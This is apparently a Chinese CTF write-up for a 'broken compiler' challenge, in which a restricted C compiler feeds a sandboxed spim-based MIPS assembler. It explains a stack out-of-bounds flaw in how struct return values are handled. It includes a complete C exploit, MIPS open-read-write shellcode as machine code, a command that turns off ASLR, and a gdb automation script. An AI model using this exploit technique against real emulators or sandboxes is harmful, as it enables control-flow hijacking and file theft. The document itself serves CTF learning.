---
redirect_from: /_posts/2018-07-03-%E8%AF%91%E7%A0%81%E6%98%BE%E7%A4%BA%E7%94%B5%E8%B7%AF/
title: bronken_compiler
tags: 复现
---

## 程序分析

spim 文件里主要是该汇编器前端包括命令行程序的实现。主要的逻辑在 CPU 文件夹里，包括内存初始化，栈，寄存器等重要数据体定义，指令解析和运行等

其中这个 instruction 结构体储存一条指令的相关信息，包括 opcode、寄存器、立即数、该指令在汇编代码中的位置等。   
在调试时我们需要根据这个结构体的信息来确认下一条执行的指令，是我在调试的时候重要的定位点(类似 ip 寄存器)  

```c
typedef struct inst_s {
  short opcode; //操纵码

  union {
    /* R-type or I-type: */  //操作数
    struct {
      unsigned char rs;
      unsigned char rt;

      union {
        short imm;

        struct {
          unsigned char rd;
          unsigned char shamt;
        } r;
      } r_i;
    } r_i;

    /* J-type: */
    mem_addr target;
  } r_t;
  int32 encoding;
  imm_expr *expr;
  char *source_line;   // 该指令所在的源代码行
} instruction;
```

## 思路

题目给了编译器源码和汇编器源码，汇编器开了沙箱，要 orw。输出一段 c 语言来让汇编器执行。但是这个 c 语言编译器 ban 掉了我们正常编程需要的所以东西包括#，“”，$等等。然后 launch 程序 ban 掉了特殊的.等字符。正常写 orw 就不可能了(天真)。所以就需要将这个汇编器当成一般程序来利用

其中一个漏洞在于汇编器对返回值的处理。所有返回值都用 `返回值寄存器` 来处理。那么涉及到高级数据结构时就不能正常处理了。

比如这行 `非叶子函数` 调用分配内存的汇编。
```mips
.Fun2:
        addi $sp, $sp, -4
        sw $fp, 0($sp)  
        move $fp, $sp
        addi $sp, $sp, n #分配n字节空间
        sw $ra, -4($fp)  #保存返回地址
    # ....
        jal .Fun1
        addi $sp,$sp,-4
        sw $2,0($sp)  # sp中存入返回值作为下一个函数的参数，假设此时这是一个结构体指针
        jal .Fun2
```
这里并没有为参数结构体分配空间，所以我们就可以越界读写栈上的其他内容。又因为调用约定里返回值和管理初始化的结构体指针等重要数据都在参数旁边。所以可以很轻易的劫持控制流和任意地址读写。

## 利用
大致思路就是定义一个函数返回一个结构体指针。然后用另一个函数接收这个结构体指针对该函数的返回地址等数据覆写。  

首先在该函数内定义一个结构体，在函数序言完之后就会立即给该结构体指针分配空间。此时劫持该指针就可以任意地址读写  
再劫持返回地址，让其指向 `text_seg` 中的某个位置就可以让汇编器跳转到这个地方去指向。然后我们再用上面劫持的指针往该地方写入 shllecode 就可以 orw 了 

这是该 orw_shllecode 的机器码
```shell
[0x00400024]	0x3c01616c  lui $1, 24940                   ; 3: li $v1, 1634493999
[0x00400028]	0x3423662f  ori $3, $1, 26159
[0x0040002c]	0x34050067  ori $5, $0, 103                 ; 4: li $5, 103
[0x00400030]	0xafa30000  sw $3, 0($29)                   ; 5: sw $v1,0($sp)
[0x00400034]	0xafa50004  sw $5, 4($29)                   ; 6: sw $5,4($sp)
[0x00400038]	0x001d2021  addu $4, $0, $29                ; 7: move $a0,$sp
[0x0040003c]	0x34050000  ori $5, $0, 0                   ; 8: li $a1,0
[0x00400040]	0x3402000d  ori $2, $0, 13                  ; 9: li $v0, 13
[0x00400044]	0x0000000c  syscall                         ; 11: syscall
[0x00400048]	0x00022021  addu $4, $0, $2                 ; 13: move $a0,$2
[0x0040004c]	0x001d2821  addu $5, $0, $29                ; 14: move $a1,$sp
[0x00400050]	0x34060040  ori $6, $0, 64                  ; 15: li $a2,64
[0x00400054]	0x3402000e  ori $2, $0, 14                  ; 16: li $v0, 14
[0x00400058]	0x0000000c  syscall                         ; 18: syscall
[0x0040005c]	0x00023021  addu $6, $0, $2                 ; 20: move $a2,$2
[0x00400060]	0x34040001  ori $4, $0, 1                   ; 21: li $a0,1
[0x00400064]	0x3402000f  ori $2, $0, 15                  ; 22: li $v0,15
[0x00400068]	0x0000000c  syscall                         ; 24: syscall
[0x0040006c]	0x3402000a  ori $2, $0, 10                  ; 27: li $v0,10
[0x00400070]	0x0000000c  syscall                         ; 28: syscall
```
因为 mips 汇编都是 32 位指令，所以每条指令都写入一个 int 的空间就行了 

exp
```c
struct bad{
    int _0;
    int _4;
    int _8;
    int _12;
};
struct bad stack_uaf(){
    struct bad local;
    return local;
}
int barrier(){
    return 0;
}

int overwrite(struct bad mystk){
    struct bad victim;
    // 此时victim指针存储在寄存器中，barrier强制将指针写回栈，并无效寄存器内容
    barrier();
    mystk._12=0x00400f00;
    // 劫持栈上$ra
    mystk._8=0x00400f00;
    // 修改栈上victim指针
    
    // 此时victim变量没有对应的寄存器，从栈上加载victim内容，即0x00400f00
    victim._0=0x3c01616c;
    victim._4=0x3423662f;
    victim._8=0x34050067;
    victim._12=0xafa30000;

    // 修改栈上victim指针
    mystk._8=0x00400f10;
    // 此时victim指针存储在寄存器中，但没有被修改，所以直接无效内容，不写回栈
    barrier();
    // 此时victim变量没有对应的寄存器，从栈上加载victim内容，即0x00400f10
    victim._0=0xafa50004;
    victim._4=0x001d2021;
    victim._8=0x34050000;
    victim._12=0x3402000d;

    mystk._8=0x00400f20;
    barrier();
    victim._0=0x0000000c;
    victim._4=0x00022021;
    victim._8=0x001d2821;
    victim._12=0x34060040;
    
    mystk._8=0x00400f30;
    barrier();
    victim._0=0x3402000e;
    victim._4=0x0000000c;
    victim._8=0x00023021;
    victim._12=0x34040001;

    mystk._8=0x00400f40;
    barrier();
    victim._0=0x3402000f;
    victim._4=0x0000000c;
    victim._8=0x3402000a;
    victim._12=0x0000000c;
    return 0;
}
int main(){
    overwrite(stack_uaf());
    return 0;
}
```

## 调试
### 调试技巧
为了查看脚本对内存的影响可以把 c 语言编译成 mpis 汇编然后看每一条汇编指针 

这里有一个调试的技巧就是把断点下到这里。  

![gdb](https://raw.githubusercontent.com/4ak5ra/image/main/gdb.png)

然后每次 c 过去就可以看到每条指令对内存的影响了。 
为了方便查看内存还可以把地址随机化完全关闭
```bash
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

调试到后面的指令的时候我们可能需要连续 c 上百次，这里就找了一个自动化调试的脚本。
```python
for i in b_slice:
    b_string += f"b *$rebase({i})\n"  
for i in range(1,51+56+176):
    b_string+= f"c\n"
# 14是b_read jal .Fstack_uaf  28是216行  25. 51是45行  

# gdbscript 用关键字参数传递
io = gdb.debug(
    [file_name, sys.argv[1]],  
    gdbscript=b_string        
)
```
但是没有搜到 `用脚本接收gdb的输出` 的方法，如果有的话就已经跟正常的调试查看内存一样方便了

### 细节调试
第一个要看的地方是 overwrite()接收 stack_uaf()参数的地方  

![](https://raw.githubusercontent.com/4ak5ra/image/main/第一结构体.png)  

这里执行了 stack_uaf 后返回了一个指针指向成员变量。下一个函数开辟栈帧后敏感数据就会在这个范围内

![](https://raw.githubusercontent.com/4ak5ra/image/main/第二结构体.png)    

这里是 overwrite()完成函数序言，分配完空间准备执行第 1 条指令的内存情况。  
可以看到该参数指针寻址范围内已经有了 `返回地址` 和 `结构体指针` 两个重要数据。大概就是这样

但是我们可以看到结构体指针的位置还是空的，那是因为此时该变量还在变量寄存器中，根据调用约定，在调用函数的时候会先把当前变量寄存器压栈。此时调用一个空函数就可以把指针写入栈供我们覆写了，也就是这句汇编
```mips
        sw $5,-8($fp)  # $5存放的就是结构体指针,放到fp-8的位置
        jal .Fbarrier   
```

后面的 barrier 调用也是差不多的思想


此时的栈结构  

![栈](https://raw.githubusercontent.com/4ak5ra/image/main/栈.png)

之后就可以随意篡改了.....


![](https://raw.githubusercontent.com/4ak5ra/image/main/返回.png)  

执行完脚本后函数返回  

可以看到接下来要去执行的 `inst` 就是 orw 的第一条指令 `0x3c01616c  lui $1, 24940 ` 了。成功劫持程序执行 shellcode



